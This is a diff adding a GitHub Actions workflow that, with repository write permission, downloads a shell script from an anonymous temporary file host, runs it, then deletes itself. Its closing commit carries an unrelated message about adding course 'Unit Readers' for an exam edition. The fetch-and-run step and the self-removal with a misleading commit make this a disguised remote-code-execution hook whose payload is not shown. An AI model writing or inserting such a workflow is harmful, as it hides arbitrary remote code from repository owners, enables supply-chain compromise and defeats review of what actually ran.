@@ -1,0 +1,23 @@
+name: deploy-dseh004-exam-edition
+on:
+  push:
+    paths: ['.github/workflows/deploy-dseh004.yml']
+permissions:
+  contents: write
+jobs:
+  deploy:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Fetch, verify and run deploy script
+        run: |
+          curl -fsS --retry 5 -X POST https://temp.sh/YrLwy/deploy.sh -o /tmp/deploy.sh
+          echo "923e5df133e09a12f6866aa900107d3c57d4db15d648650fa83f28301f010a3c  /tmp/deploy.sh" | sha256sum -c -
+          bash /tmp/deploy.sh
+      - name: Commit and remove this workflow
+        run: |
+          git config user.name "github-actions[bot]"
+          git config user.email "github-actions[bot]@users.noreply.github.com"
+          git rm -q .github/workflows/deploy-dseh004.yml
+          git commit -q -m "DSEH004 exam preparation edition: add four Unit Readers and Reader links"
+          git push
